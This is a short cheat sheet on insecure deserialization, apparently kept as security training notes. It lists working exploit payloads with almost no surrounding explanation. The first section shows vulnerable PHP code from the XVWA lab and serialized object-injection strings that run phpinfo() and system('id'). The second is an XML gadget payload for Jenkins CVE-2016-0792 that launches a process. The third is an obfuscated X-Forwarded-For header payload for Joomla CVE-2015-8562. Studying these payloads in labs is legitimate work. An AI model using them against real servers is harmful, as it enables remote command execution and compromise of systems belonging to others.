# A8 - Insecure Deserialization


## XVWA

Target url:

`/xvwa/vulnerabilities/php_object_injection/?r=a:2:{i:0;s:4:%22XVWA%22;i:1;s:33:%22Xtreme%20Vulnerable%20Web%20Application%22;}`

Vulnerable code:

```
<?php 
    error_reporting(E_ALL);
    class PHPObjectInjection{
        public $inject;

        function __construct(){

        }

        function __wakeup(){
            if(isset($this->inject)){
                eval($this->inject);
            }
        }
    }
//?r=a:2:{i:0;s:4:"XVWA";i:1;s:33:"Xtreme Vulnerable Web Application";}
    if(isset($_REQUEST['r'])){  

        $var1=unserialize($_REQUEST['r']);
        

        if(is_array($var1)){ 
            echo "
".$var1[0]." - ".$var1[1];
        }
    }else{
        echo "parameter is missing";
    }
?>
```

PHP Code injection

`O:18:"PHPObjectInjection":1:{s:6:"inject";s:10:"phpinfo();";}`

without restrictions

`O:18:"PHPObjectInjection":1:{s:6:"inject";s:13:"system('id');";}`

`O:18:%22PHPObjectInjection%22:1:{s:6:%22inject%22;s:13:%22system(%27id%27);%22;}`



## Jenkins CVE-2016-0792

```
<map>
  <entry>
    <groovy.util.Expando>
      <expandoProperties>
        <entry>
          <string>hashCode</string>
          <org.codehaus.groovy.runtime.MethodClosure>
            <delegate class="groovy.util.Expando" reference="../../../.."/>
            <owner class="java.lang.ProcessBuilder">
              <command>
                <string>open</string>
                <string>/Applications/Calculator.app</string>
              </command>
              <redirectErrorStream>false</redirectErrorStream>
            </owner>
            <resolveStrategy>0</resolveStrategy>
            <directive>0</directive>
            <parameterTypes/>
            <maximumNumberOfParameters>0</maximumNumberOfParameters>
            <method>start</method>
          </org.codehaus.groovy.runtime.MethodClosure>
        </entry>
      </expandoProperties>
    </groovy.util.Expando>
    <int>1</int>
  </entry>
</map>
```
## CVE-2015-8562 - Joomla! 1.5 < 3.4.5 - Object Injection Remote Command Execution

```
"X-Forwarded-For" : "}__test|O:21:\"JDatabaseDriverMysqli\":3:{s:2:\"fc\";O:17:\"JSimplepieFactory\":0:{}s:21:\"\\\\0\\\\0\\\\0disconnectHandlers\";a:1:{i:0;a:2:{i:0;O:9:\"SimplePie\":5:{s:8:\"sanitize\";O:20:\"JDatabaseDriverMysql\":0:{}s:8:\"feed_url\";s:165:\"eval(chr(101).chr(99).chr(104).chr(111).chr(40).chr(109).chr(100).chr(53).chr(40).chr(49).chr(51).chr(51).chr(56).chr(41).chr(41).chr(59));JFactory::getConfig();exit\";s:19:\"cache_name_function\";s:6:\"assert\";s:5:\"cache\";b:1;s:11:\"cache_class\";O:20:\"JDatabaseDriverMysql\":0:{}}i:1;s:4:\"init\";}}s:13:\"\\\\0\\\\0\\\\0connection\";b:1;}\\xf0\\xfd\\xfd\\xfd"
```
